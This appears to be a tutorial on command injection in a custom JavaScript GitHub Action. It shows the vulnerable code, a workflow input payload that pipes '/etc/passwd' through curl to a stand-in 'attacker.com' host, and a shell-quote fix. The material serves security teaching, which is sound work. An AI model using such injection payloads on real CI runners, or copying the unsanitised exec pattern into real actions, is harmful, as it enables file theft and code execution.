# Advanced Attack Scenario 5: Exploiting vulnerabilities in custom GitHub Actions written in JavaScript or Docker

This scenario demonstrates how an attacker can exploit a command injection vulnerability in a custom GitHub Action written in JavaScript.

## The Vulnerability

A custom GitHub Action written in JavaScript that has a command injection vulnerability. The vulnerability lies in the fact that the action does not properly sanitize user input before using it to construct a shell command.

**Vulnerable Code (`action.yml`):**

```yaml
name: 'Vulnerable Action'
description: 'A vulnerable custom action'
inputs:
  name:
    description: 'A name to greet'
    required: true
    default: 'World'
runs:
  using: 'node16'
  main: 'index.js'
```

**Vulnerable Code (`index.js`):**

```javascript
const core = require('@actions/core');
const exec = require('@actions/exec');

async function run() {
  try {
    const name = core.getInput('name');
    await exec.exec(`echo "Hello, ${name}!"`);
  } catch (error) {
    core.setFailed(error.message);
  }
}

run();
```

## The Exploitation

An attacker can exploit the vulnerability to execute arbitrary commands on the runner.

**Malicious Payload:**

An attacker can create a workflow that uses the vulnerable action and passes a malicious payload as the `name` input.

```yaml
name: Malicious Workflow
on:
  push:
jobs:
  malicious_job:
    runs-on: ubuntu-latest
    steps:
      - uses: ./path/to/vulnerable-action
        with:
          name: '; curl http://attacker.com/$(cat /etc/passwd | base64)'
```

**Expected Outcome:**

The workflow will execute the `curl` command, sending the base64-encoded contents of the `/etc/passwd` file to the attacker's server.

## The Mitigation

To mitigate this vulnerability, you should properly sanitize user input in your custom GitHub Actions. For example, you can use a library like `shell-quote` to escape any special characters in the user input.

**Fixed Code (`index.js`):**

```javascript
const core = require('@actions/core');
const exec = require('@actions/exec');
const quote = require('shell-quote');

async function run() {
  try {
    const name = core.getInput('name');
    const quotedName = quote.quote([name]);
    await exec.exec(`echo "Hello, ${quotedName}!"`);
  } catch (error) {
    core.setFailed(error.message);
  }
}

run();
```
